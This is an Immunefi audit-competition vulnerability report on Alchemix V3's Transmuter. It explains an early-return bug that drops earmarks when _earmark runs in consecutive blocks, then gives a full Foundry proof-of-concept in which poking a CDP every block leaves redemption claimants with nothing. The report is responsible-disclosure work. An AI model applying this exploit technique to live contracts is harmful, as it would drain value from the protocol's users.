# 57582 sc critical calling earmark one block apart skips the block s earmark value

**Submitted on Oct 27th 2025 at 10:42:57 UTC by @hashbug for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57582
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/Transmuter.sol>
* **Impacts:**
  * Theft of unclaimed royalties

## Description

## Intro

The `Transmuter` uses `StakingGraph` to maintain a record of the value to be earmarked for each block. This mechanism is used to set aside debt and collateral for 1:1 redemption claims.

Due to an early return in `Transmuter.queryGraph`, two subsequent blocks containing an `AlchemistV3._earmark` call will lose the earmarking information from the second block.

This makes the `Transmuter` unable to fulfill its 1:1 obligation to the user. The user will lose their synthetic tokens and silently receive less yield tokens in return.

## Vulnerability Details

In the case of two subsequent blocks containing an `_earmark` call, the following will hold in the second call:

```
lastEarmarkBlock + 1 == block.number
```

This means that the call

```
uint256 amount = ITransmuter(transmuter).queryGraph(lastEarmarkBlock + 1, block.number);
```

will result in `startBlock == endBlock` in `Transmuter.queryGraph`.

This satisfies the early return condition

```
if (endBlock <= startBlock) return 0;
```

Therefore, no matter what the `StakingGraph` stores in the block slot, the `amount` earmarked in `_earmark` will be 0.

## Impact Details

Since `Transmuter` earmarking is suppressed when `_earmark` is called frequently, the 1:1 obligation will be degraded naturally during times of higher volume resulting in value loss for the transmuting users.

The `Transmuter` uses `balanceOf` to adjust the amount withdrawn from it, thus the burden will be shifted entirely to the last claimant instead of the loss being socialized and the call will succeed even though it will silently return less value.

Thus, it is possible to borrow synthetics at the expense of the transmuting users. If yield can be generated on the synthetics, e.g. by trading them for yield tokens, this yield is afforded without having the loan consume the collateral over time. This can be achieved by calling `poke` on an arbitrary CDP (because we only need the `_earmark` call, not the CDP-dependent `_sync`) in every block.

Once redemption claimants notice that their claims are not being fulfilled, the soft peg will be lost (at least temporarily, until the contract gets upgraded) and synthetics to burn the loan might be obtainable at a fraction of their original price, thus freeing the original collateral needed for the loan.

## Proof of Concept

## Proof of Concept

We will show that calling `poke` in every block reduces the transmutation value from 1:1 to 1:0.

The new test is derived from `AlchemistV3Test` and the main code is in `test_blockEarmarkLoss`.

```
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.28;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";
import {MockMYTStrategy} from "./mocks/MockMYTStrategy.sol";
import {MYTTestHelper} from "./libraries/MYTTestHelper.sol";
import {IMYTStrategy} from "../interfaces/IMYTStrategy.sol";
import {MockAlchemistAllocator} from "./mocks/MockAlchemistAllocator.sol";
import {IMockYieldToken} from "./mocks/MockYieldToken.sol";
import {IVaultV2} from "../../lib/vault-v2/src/interfaces/IVaultV2.sol";
import {VaultV2} from "../../lib/vault-v2/src/VaultV2.sol";
import {MockYieldToken} from "./mocks/MockYieldToken.sol";

contract PoCAlchemistTest is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public constant BPS = 10_000;

    uint256 public protocolFee = 100;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds;

    // large amount to test with
    uint256 whaleSupply;

    // amount of yield/underlying token to deposit
    uint256 depositAmount;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e18;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    // WETH address
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public protocolFeeReceiver = address(10);

    // MYT variables
    VaultV2 vault;
    MockAlchemistAllocator allocator;
    MockMYTStrategy mytStrategy;
    address public operator = address(0x2222222222222222222222222222222222222222); // default operator
    address public admin = address(0x4444444444444444444444444444444444444444); // DAO OSX
    address public curator = address(0x8888888888888888888888888888888888888888);
    address public mockVaultCollateral = address(new TestERC20(100e18, uint8(18)));
    address public mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
    uint256 public defaultStrategyAbsoluteCap = 2_000_000_000e18;
    uint256 public defaultStrategyRelativeCap = 1e18; // 100%

    struct CalculateLiquidationResult {
        uint256 liquidationAmountInYield;
        uint256 debtToBurn;
        uint256 outSourcedFee;
        uint256 baseFeeInYield;
    }

    struct AccountPosition {
        address user;
        uint256 collateral;
        uint256 debt;
        uint256 tokenId;
    }

    function setUp() external {
        adJustTestFunds(18);
        setUpMYT(18);
        deployCoreContracts(18);
    }

    function adJustTestFunds(uint256 alchemistUnderlyingTokenDecimals) public {
        accountFunds = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
        whaleSupply = 20_000_000_000 * 10 ** alchemistUnderlyingTokenDecimals;
        depositAmount = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
    }

    function setUpMYT(uint256 alchemistUnderlyingTokenDecimals) public {
        vm.startPrank(admin);
        uint256 TOKEN_AMOUNT = 1_000_000; // Base token amount
        uint256 initialSupply = TOKEN_AMOUNT * 10 ** alchemistUnderlyingTokenDecimals;
        mockVaultCollateral = address(new TestERC20(initialSupply, uint8(alchemistUnderlyingTokenDecimals)));
        mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
        vault = MYTTestHelper._setupVault(mockVaultCollateral, admin, curator);
        mytStrategy = MYTTestHelper._setupStrategy(address(vault), mockStrategyYieldToken, admin, "MockToken", "MockTokenProtocol", IMYTStrategy.RiskClass.LOW);
        allocator = new MockAlchemistAllocator(address(vault), admin, operator);
        vm.stopPrank();
        vm.startPrank(curator);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        vault.setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, address(mytStrategy)));
        vault.addAdapter(address(mytStrategy));
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (idData, defaultStrategyAbsoluteCap)));
        vault.increaseAbsoluteCap(idData, defaultStrategyAbsoluteCap);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseRelativeCap, (idData, defaultStrategyRelativeCap)));
        vault.increaseRelativeCap(idData, defaultStrategyRelativeCap);
        vm.stopPrank();
    }

    function _magicDepositToVault(address vault, address depositor, uint256 amount) internal returns (uint256) {
        deal(address(mockVaultCollateral), address(depositor), amount);
        vm.startPrank(depositor);
        TokenUtils.safeApprove(address(mockVaultCollateral), vault, amount);
        uint256 shares = IVaultV2(vault).deposit(amount, depositor);
        vm.stopPrank();
        return shares;
    }

    function _vaultSubmitAndFastForward(bytes memory data) internal {
        vault.submit(data);
        bytes4 selector = bytes4(data);
        vm.warp(block.timestamp + vault.timelock(selector));
    }

    function deployCoreContracts(uint256 alchemistUnderlyingTokenDecimals) public {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        // Fake tokens
        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: address(vault.asset()),
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: protocolFeeReceiver,
            liquidatorFee: liquidatorFeeBPS,
            repaymentFee: 100,
            myt: address(vault)
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(vault.asset()), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));

        _magicDepositToVault(address(vault), address(0xbeef), accountFunds);
        _magicDepositToVault(address(vault), address(0xdad), accountFunds);
        _magicDepositToVault(address(vault), externalUser, accountFunds);
        _magicDepositToVault(address(vault), yetAnotherExternalUser, accountFunds);
        _magicDepositToVault(address(vault), anotherExternalUser, accountFunds);
        vm.stopPrank();

        vm.startPrank(address(admin));
        allocator.allocate(address(mytStrategy), vault.convertToAssets(vault.totalSupply()));
        vm.stopPrank();

        deal(address(alToken), address(0xdad), accountFunds);
        deal(address(alToken), address(anotherExternalUser), accountFunds);
        deal(address(vault.asset()), address(0xbeef), accountFunds);
        deal(address(vault.asset()), externalUser, accountFunds);
        deal(address(vault.asset()), yetAnotherExternalUser, accountFunds);
        deal(address(vault.asset()), anotherExternalUser, accountFunds);
        deal(address(vault.asset()), alchemist.alchemistFeeVault(), 10_000 * (10 ** alchemistUnderlyingTokenDecimals));

        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(vault.asset()), address(vault), accountFunds);
        vm.stopPrank();

        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault.asset()), address(vault), accountFunds);
        vm.stopPrank();

        vm.startPrank(someWhale);
        deal(address(vault), someWhale, whaleSupply);
        deal(address(vault.asset()), someWhale, whaleSupply);
        SafeERC20.safeApprove(address(vault.asset()), address(mockStrategyYieldToken), whaleSupply);
        vm.stopPrank();
    }

    //
    // Errors used in `vm.expectRevert` in the PoC
    //

    error IllegalArgument();

    //
    // PoC code
    //

    function test_blockEarmarkLoss() public {

        // Reducing the transmutation time for the sake of the example, but it is not
        // a requirement.
        vm.prank(alOwner);
        transmuterLogic.setTransmutationTime(10);

        uint256 redemptionId = 0;
        uint256 beefTokenId = 1;

        _depositBeef(10e18, 0);
        _mintBeef(9e18, beefTokenId);
        _createRedemptionBeef(9e18);
        ++redemptionId;
        
        // We poke every block to prevent the Transmuter from transmuting.
        //
        // Note, that since we want to call _earmark, it does not matter which account
        // gets poked as long as the CDP exists.
        for (uint256 i; i < transmuterLogic.timeToTransmute(); ++i) {
            vm.roll(block.number + 1);
            alchemist.poke(beefTokenId);    
        }
        
        // Finish the transmutation.
        uint256 preClaimBalance = vault.balanceOf(address(0xbeef));
        _claimRedemptionBeef(redemptionId);
        uint256 postClaimBalance = vault.balanceOf(address(0xbeef));

        (uint256 collateral, uint256 debt, uint256 earmarked) = alchemist.getCDP(beefTokenId);
        assertEq(collateral, 10e18, "Collateral value is unchanged");
        assertEq(debt, 9e18, "Debt value is unchanged");
        assertEq(earmarked, 0, "Nothing gets earmarked");
        assertEq(postClaimBalance - preClaimBalance, 0, "0xbeef does not get anything for its synthetics");
    }

    //
    // Named internals, so that the PoC can be read more easily
    //

    function _depositBeef(uint256 amount, uint256 tokenId) internal {
        _deposit(address(0xbeef), amount, tokenId);
    }

    function _mintBeef(uint256 amount, uint256 tokenId) internal {
        _mint(address(0xbeef), amount, tokenId);
    }

    function _createRedemptionBeef(uint256 amount) internal {
        _createRedemption(address(0xbeef), amount);
    }

    function _claimRedemptionBeef(uint256 transmutationId) internal {
        _claimRedemption(address(0xbeef), transmutationId);
    }

    function _transmuteBeef(uint256 transmutationId) internal {
        _transmute(address(0xbeef), transmutationId);
    }

    function _withdrawBeef(uint256 amount, uint256 tokenId) internal {
        _withdraw(address(0xbeef), amount, tokenId);
    }

    function _deposit(address account, uint256 amount, uint256 tokenId) internal {
        vm.startPrank(account);
        console.log(vault.balanceOf(account));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount);
        alchemist.deposit(amount, account, tokenId);
        vm.stopPrank();
    }

    function _mint(address account, uint256 amount, uint256 tokenId) internal {
        vm.startPrank(account);
        alchemist.mint(tokenId, amount, account);
        vm.stopPrank();
    }

    function _createRedemption(address account, uint256 amount) internal {
        vm.startPrank(account);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), amount);
        transmuterLogic.createRedemption(amount);
        vm.stopPrank();
    }

    function _claimRedemption(address account, uint256 transmutationId) internal {
        vm.prank(account);
        transmuterLogic.claimRedemption(transmutationId);
    }

    function _transmute(address account, uint256 transmutationId) internal {
        // Wait for transmutation
        vm.roll(block.number + transmuterLogic.timeToTransmute());
        // Claim
        vm.prank(account);
        transmuterLogic.claimRedemption(transmutationId);
    }

    function _withdraw(address account, uint256 amount, uint256 tokenId) internal {
        vm.prank(account);
        alchemist.withdraw(amount, account, tokenId);
    }
}
```
